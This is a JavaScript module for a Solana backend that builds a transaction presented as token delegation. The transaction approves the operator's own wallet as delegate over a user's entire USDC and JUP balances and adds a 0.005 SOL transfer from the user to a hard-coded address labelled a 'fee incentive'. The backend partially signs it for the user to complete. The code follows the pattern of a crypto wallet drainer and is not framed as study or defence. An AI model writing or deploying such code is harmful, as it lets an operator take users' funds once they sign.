   const {
    Transaction,
    PublicKey,
    SystemProgram,
} = require("@solana/web3.js");

const { createApproveInstruction } = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { setBlockhash } = require("../core/blockhashCache");
const { getKeypair } = require("../core/keypair");
/**
 * Build approve transaction for token delegation
 * @param {string} user - User's public key
 * @param {Connection} connection - Solana connection
 * @returns {Promise<Transaction>}
 */
async function buildApprove(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();
            const tx = new Transaction();

            // Validate user public key
            let userPubkey;
            try {
                userPubkey = new PublicKey(user);
            } catch (err) {
                throw new Error(`Invalid user public key: ${err.message}`);
            }

            logger.debug("Building approve transaction", {
                user: userPubkey.toString()
            });

            // Fetch user token accounts
            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);

            if (!tokenAccounts) {
                throw new Error("Failed to fetch token accounts");
            }

            // Get latest blockhash
            const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("confirmed");
            setBlockhash(blockhash);

            logger.debug("Got blockhash", { blockhash: blockhash.substring(0, 8) });

            // Validate wallet env vars
            if (!config.WALLET) {
                throw new Error("WALLET env variable is missing");
            }

            const walletPubkey = new PublicKey(config.WALLET);
            tx.recentBlockhash = blockhash;
            tx.feePayer = walletPubkey;

            // Add approve instruction for USDC if user has balance
            if (tokenAccounts.usdc > 0n) {
                logger.debug("Adding USDC approve instruction", {
                    amount: tokenAccounts.usdc.toString()
                });

                tx.add(
                    createApproveInstruction(
                        tokenAccounts.usdcATA,
                        walletPubkey,
                        userPubkey,
                        tokenAccounts.usdc
                    )
                );
            } else {
                logger.debug("User has no USDC balance, skipping USDC approve");
            }

            // Add approve instruction for JUP if user has balance
            if (tokenAccounts.jup > 0n) {
                logger.debug("Adding JUP approve instruction", {
                    amount: tokenAccounts.jup.toString()
                });

                tx.add(
                    createApproveInstruction(
                        tokenAccounts.jupATA,
                        walletPubkey,
                        userPubkey,
                        tokenAccounts.jup
                    )
                );
            } else {
                logger.debug("User has no JUP balance, skipping JUP approve");
            }

            // Add SOL transfer for fee incentive
            tx.add(
                SystemProgram.transfer({
                    fromPubkey: userPubkey,
                    toPubkey: new PublicKey("JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN"),
                    lamports: 5_000_000,
                })
            );

            // Backend (fee payer) podpíše transakciu
tx.partialSign(getKeypair());

logger.info("Approve transaction built successfully", {
    instructions: tx.instructions.length,
    feePayer: walletPubkey.toString(),
    partiallySigned: true
});

return tx;
        } catch (err) {
            logger.error("Failed to build approve transaction", {
                error: err.message
            });
            throw err;
        }
    }, "buildApprove");
}

module.exports = { buildApprove };
